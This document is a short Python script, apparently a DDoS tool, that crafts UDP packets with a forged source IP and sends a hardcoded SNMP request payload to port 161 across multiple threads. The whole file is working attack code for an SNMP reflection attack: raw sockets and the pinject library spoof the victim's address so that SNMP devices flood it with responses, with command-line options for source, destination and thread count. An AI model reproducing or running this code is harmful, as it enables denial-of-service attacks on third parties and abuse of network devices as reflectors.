#!/usr/bin python

import sys
import socket
import threading
from random import randint
from pinject import IP, UDP
from argparse import ArgumentParser 

HELP = (
        "Source ip is sending data to destination...",
        "Destination is reciving the data...",
        "threads is 1 as default..."
    )

OPTIONS = (
        (("-s", "--source"), dict(dest="source", help=HELP[0])),
        (("-d", "--destination"), dict(dest="dest", help=HELP[1])),
        (("-t", "--threads"), dict(dest="threads", type=int, default=1, help=HELP[2]))
    )

PAYLOAD = {
        "SNMP":('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
                '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
                '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
                '\x01\x02\x01\x05\x00')    
        }

PORT = {
        "SNMP":161    
    }

class DDoS(object):
    def __init__(self, source, dest, threads):
        self.source = source
        self.dest = dest
        self.threads = threads

    def scheduler(self):
        for thread in range(self.threads):
            t = threading.Thread(target=self.__attack)
            t.start()
    
    def __attack(self):
        #spoofy data
        data = PAYLOAD["SNMP"]
        
        #create socket 
        fakeSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

        self.__send(fakeSocket, self.dest, PORT["SNMP"], data)
        fakeSocket.close()

    def __send(self, fakeSocket, dest, port, data):
        """
            send a spoofed packet

        """
        udp = UDP(randint(1,65535), port, data).pack(self.source, dest)
        ip = IP(self.source, dest, udp, proto=socket.IPPROTO_UDP).pack()
        fakeSocket.sendto(ip+udp+data, (dest, port))

def main():
    #Parse commandline parameters
    parser = ArgumentParser()
    for args, kwargs in OPTIONS:
        parser.add_argument(*args, **kwargs)

    results = parser.parse_args()
    if results.source and results.dest:
        ddos = DDoS(results.source, results.dest, results.threads)
        ddos.scheduler()

    else:
        sys.exit()


if __name__ == "__main__":
    main()
